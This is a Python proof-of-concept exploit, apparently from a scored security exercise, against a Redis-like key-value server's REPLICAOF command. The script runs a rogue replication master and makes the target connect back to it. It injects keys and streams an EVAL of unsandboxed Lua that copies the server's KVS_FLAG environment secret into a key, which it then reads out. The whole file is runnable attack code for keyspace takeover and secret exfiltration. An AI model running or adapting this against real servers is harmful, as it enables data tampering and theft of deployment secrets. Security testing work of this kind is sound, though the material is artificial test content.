#!/usr/bin/env python3
"""
PoC #3: REPLICAOF an attacker-controlled master -> keyspace takeover
--------------------------------------------------------------------
Location: cmdReplicaOf() and Server.replicateFrom() in replication.go.

REPLICAOF <host> <port> makes the server dial out to whatever address the
client names and then apply EVERY RESP command that peer streams back, as if
it were a trusted replication master — no peer authentication, no allow-list,
no command restriction. This mirrors real Redis's master/slave trust model.
The replicated session is created with `authenticated: true` ("the master is
implicitly trusted", replication.go), so this isn't limited to plain SETs: a
rogue master can stream an `EVAL` too, chaining straight into vuln #2's
unsandboxed Lua.

This PoC is fully self-contained and self-verifying over the network:
  1. It stands up a rogue "master": a plain TCP listener in this process.
  2. It tells the target `REPLICAOF <us> <our_port>` over a normal client
     connection.
  3. The target dials back; we feed it a RESP command stream that injects a
     key AND an `EVAL` that copies the server's real `KVS_FLAG` secret (via
     `os.getenv`) into an attacker-chosen key. Replies on the replication link
     are discarded (`replicaConn.Write` is a no-op) so we can't read EVAL's
     return value directly off that connection — instead we have the script SET
     the result into the keyspace itself.
  4. Over the ORIGINAL client connection we GET both the injected key (proof
     of keyspace takeover) and the exfil key (proof the takeover reaches all
     the way to the deployment's real secret, not just attacker-chosen data).

Run: python3 03_replicaof_injection.py [host] [port]
"""
import os
import socket
import sys
import threading
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
# If a real KVS_REQUIREPASS is configured for the target (the kvs-auth
# instance), REPLICAOF/GET/EVAL are all gated by the same AUTH check, so the
# normal client connection has to authenticate first.
REQUIREPASS = os.environ.get("KVS_REQUIREPASS", "")
# The per-deployment secret the exfil EVAL steals via os.getenv('KVS_FLAG').
# Both kvs and kvs-auth carry it; if a harness told us the value we assert it.
EXPECTED_FLAG = os.environ.get("KVS_FLAG", "")


def encode(*parts):
    out = b"*%d\r\n" % len(parts)
    for p in parts:
        p = p.encode() if isinstance(p, str) else p
        out += b"$%d\r\n%s\r\n" % (len(p), p)
    return out


def read_reply(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def cmd(sock, *parts):
    sock.sendall(encode(*parts))
    return read_reply(sock)


def parse_bulk(reply):
    """Payload of a RESP bulk string ($<len>\\r\\n<data>\\r\\n), or None for a
    nil/non-bulk reply."""
    if not reply or reply[:1] != b"$":
        return None
    try:
        header, rest = reply.split(b"\r\n", 1)
        n = int(header[1:])
    except ValueError:
        return None
    if n < 0:
        return None
    return rest[:n]


def main():
    token = uuid.uuid4().hex
    injected_key = f"repl_pwn_{token}"
    exfil_key = f"repl_exfil_{token}"

    # Normal client connection to the victim.
    client = socket.create_connection((HOST, PORT), timeout=15)
    # Whether the *target* actually has a matching KVS_REQUIREPASS is decided
    # by the AUTH reply, not just by whether this PoC's own env has the var
    # set -- the same script needs to behave against both the no-auth default
    # `kvs` and the password-protected `kvs-auth` without the caller having to
    # know which is which.
    auth_ok = False
    if REQUIREPASS:
        auth_reply = cmd(client, "AUTH", REQUIREPASS)
        auth_ok = auth_reply.startswith(b"+OK")
    # The source address the victim sees for us is an address it can dial back.
    my_ip = client.getsockname()[0]

    # Stand up the rogue master listener.
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", 0))
    listener.listen(1)
    my_port = listener.getsockname()[1]
    print(f"[*] Rogue master listening, advertising {my_ip}:{my_port} to the victim")

    served = {"ok": False}

    def serve_master():
        try:
            listener.settimeout(15)
            peer, addr = listener.accept()
            print(f"[*] Victim dialed back from {addr} — feeding it a command stream")
            # Drain the victim's handshake (PING/REPLCONF/PSYNC) briefly.
            peer.settimeout(1.0)
            try:
                peer.recv(4096)
            except socket.timeout:
                pass
            # Inject keys as if we were the trusted master.
            peer.sendall(encode("SET", injected_key, token))
            peer.sendall(encode("SET", f"{injected_key}:admin", "owned-via-replication"))
            # Chain into vuln #2: stream an EVAL that reads the server's own
            # KVS_FLAG out of its process environment and SETs it into an
            # attacker-chosen key. EVAL's own return value never reaches us
            # (replicaConn.Write discards replies on this link) so we exfil by
            # writing it into the keyspace instead, and read it back over our
            # normal client connection below.
            exfil_script = (
                "redis.call('SET', KEYS[1], os.getenv('KVS_FLAG') or '')"
            )
            peer.sendall(encode("EVAL", exfil_script, "1", exfil_key))
            time.sleep(1.0)
            served["ok"] = True
            peer.close()
        except Exception as e:  # noqa: BLE001
            print(f"[-] master thread error: {e}")

    t = threading.Thread(target=serve_master, daemon=True)
    t.start()

    print(f"[*] REPLICAOF {my_ip} {my_port} -> {cmd(client, 'REPLICAOF', my_ip, str(my_port))!r}")

    # Give replication time to connect + apply.
    deadline = time.time() + 12
    got = b""
    while time.time() < deadline:
        got = cmd(client, "GET", injected_key)
        if token.encode() in got:
            break
        time.sleep(0.5)

    print(f"[*] GET {injected_key} -> {got!r}")

    exfiltrated = cmd(client, "GET", exfil_key)
    print(f"[*] GET {exfil_key} -> {exfiltrated!r}")

    client.close()
    listener.close()

    if token.encode() not in got:
        print("[-] Injection not observed (replication may have been restricted)")
        return 1
    print("[+] Confirmed: an untrusted 'master' injected data into the victim's keyspace")

    stolen = parse_bulk(exfiltrated)
    if not stolen:
        print("[-] Exfil key was empty — the EVAL-over-replication chain didn't land a")
        print("    secret (replication or EVAL may have been restricted). NOT scored.")
        return 1
    if EXPECTED_FLAG and stolen != EXPECTED_FLAG.encode():
        print(f"[-] Exfiltrated {stolen!r} but the expected KVS_FLAG is {EXPECTED_FLAG!r}")
        print("    — value mismatch, not a clean disclosure.")
        return 1

    print("[+] SCORED: the rogue master's EVAL disclosed the deployment's real")
    print(f"    KVS_FLAG secret ({stolen.decode(errors='replace')!r}) via os.getenv() over")
    print("    the replication link -- keyspace takeover chains into secret theft.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
